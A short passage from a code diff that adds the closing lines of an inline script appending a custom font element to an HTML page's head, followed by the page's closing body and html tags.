+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
